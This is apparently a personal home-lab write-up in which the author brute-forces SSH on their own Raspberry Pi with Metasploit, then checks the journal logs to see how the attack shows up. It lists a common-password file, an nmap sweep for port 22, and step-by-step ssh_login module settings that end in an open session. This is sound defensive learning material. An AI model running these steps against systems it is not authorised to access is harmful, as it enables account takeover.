# Linux Bruteforce investigation.

This file shows how I recreated and investigated a bruteforce attack using **Metasploit** on a Kali linux virtual machine to attack my Raspberry Pi running Raspberry Pi OS (Linux Debian Trixie with Raspberry Pi Desktop) using SSHw. I recreated this type of attack to get a better understand how logs can be used to identify if a system has been attacked.

**What is a bruteforce attack?**  
A bruteforce attack is when an attacker attempts to get access to a machine by testing different passwords. These passwords are usualy a list of the most common passwords or passwords taken from a data breach (credential stuffing) in hopes that the user has used a simple password or has reused their password across diffrent sites. These passwords are usually tested automatically with a script or tool such as **metasploit** or **hydra**.

**How do you identify a brute force attack?**  
Repeated failed authentication attempts in a short period of time for the same user.

**What would be a false positive for a bruteforce attack?**
A user who has forgotten their password but instead of resetting the password, they try diffrent variations of their password in an attempt to get access to their account/device. Their constant attempt at guessing will trigger an alert of a bruteforce (if setup correctly) and lockout the users account/device.

**How do you prevent bruteforce attacks?**  
Configuring the password difficulty rules to prevent users reusing simple passwords. For example, we can configure a password history rule so the user cannot reuse their previous password. We can also configure a rule that requires the user to enter a password that is longer than the standard 8 length password which increases the difficulty of cracking the password.

We also need to configure the machine to lockdown (either for a set period of time or until IT helpdesk unlocks the device) after a set amount of failed authentication attempts. This will restrict the amount of times an attacker can guess the password before being locked out of the device.

**What is SSH?**
SSH (Secure Shell) is a "cryptographic network protocol" that is used to get remote access to a device on a network.

-----

### My setup:

**Attack machine:**  
Operating System: Kali Linux 10.4  
Specific Applications: Metasploit framework  

**Linux vulnerable machine:**  
Operating System: Raspberry Pi OS (Linux Debian Trixie with Raspberry Pi Desktop)
Specific tools enabled: SSH (Password authentication)


For more information on how I created my attack machine, see my **Kali Linux Attack VM** repository [here]().

Before attacking the victim device, I first made sure to activate and connect to the device via SSH to check the device was operating correctly.

> Before connecting, I made sure to enter an incorrect password so I can check failed authentication logs are being recorded.

Once I was on the device, I checked the authentication logs for one failed authentication log and 1 successful authentication log.

<img alt="Successful and failed authenitication logs" src="" width=200px>

-----

### Creating my password list

On my attack VM, I created a text document with 10 passwords to test (9 of the most used passwords and the correct password).

```
$ nano ~/passwords.txt

123456
password
123456789
qwerty
12345
111111
123123
admin
iloveyou
***********
```

-----

### Reconnaissance

Before I could attack my victim device via SSH, I first needed to find the device on my network. To do this, I searched what my IP range was by using `ip a` on my attack VM.
```
$ ip a
```

<img alt="ip a scan" src="" width=300px>

To get the IP range, you need to look under `eth0` for `inet x.x.x.x/x`

> - `eth` = ethernet, `0` = first, `eth0` = the first ethernet interface.
> - `inet` - internet protocol (IPv4)

Once I had the IP range, I could use nmap to scan the range for devices that are using port 22 (commonly used by SSH):
```
$ nmap -p 22 x.x.x.x/x
```

<img alt="nmap scan for port 22" src="" width=300px>

From the results of the scan, I could see my Rasperry Pi's IP address and see that port 22 is open. Now I can begin to attack the device.

-----

### The attack

To start my attack, I started **Metasploit** on my attack VM:
```
msfconsole
```

Once **Metasploit** has loaded (you will see `msf6 >`), I selected the SSH brute-force module:
```
msf6 > use auxiliary/scanner/ssh/ssh_login
```

> To see all configuration options, you can do `show options` and you will see a list of all the options you can edit:
> ```
> msf6 > auxiliary(scanner/ssh/ssh_login) > show options
> ```

To configue the attack, we need to adjust the following options:

- Set target IP address (RHOSTS):
```
msf6 > auxiliary(scanner/ssh/ssh_login) > set RHOSTS x.x.x.x
```

- Set the username of the user you are trying to login with:
```
msf6 > auxiliary(scanner/ssh/ssh_login) > set USERNAME xxxxx
```

- Set the password list (PASS_LIST):
```
msf6 > auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/attackVM/passwords.txt
```

- Set `STOP_ON_SUCCESS` to stop running when the correct password is found:
```
msf6 > auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
```

- If you want to see all attempts printed out, you can set `VERBOSE` mode to `True`:
```
msf6 > auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
```

Once all options have been set, run the Bruteforce attack:
```
msf6 > auxiliary(scanner/ssh/ssh_login) > run
```

Metasploit will now attempt each password and create a SSH session on the device:  

<img alt="Metasploit running bruteforce attack" src="" width=300px>

If the bruteforce was successful, you will see a session has been created. To view your sessions, you can run `sessions`:
```
msf6 > auxiliary(scanner/ssh/ssh_login) > sessions
```
<img alt="metasploit sessions" src="" width=300px>

To get access to the session, you can use `sessions -i (Session number)`:
```
msf6 > auxiliary(scanner/ssh/ssh_login) > sessions -i 1
```

To quit your session, run `exit`

-----

### What the logs showed:

To get the logs, I accessed my vulnerable machine and checked the latest journal logs:
```
$ journalctl -r
```

Here are the logs:
<img alt="Post Bruteforce logs" src="" width=300px>

As we can see, the logs correctly identified 9 failed password attempts and then 1 successful login attempt. By looking at the times between the logs, this was clearly a bruteforce attack.

-----













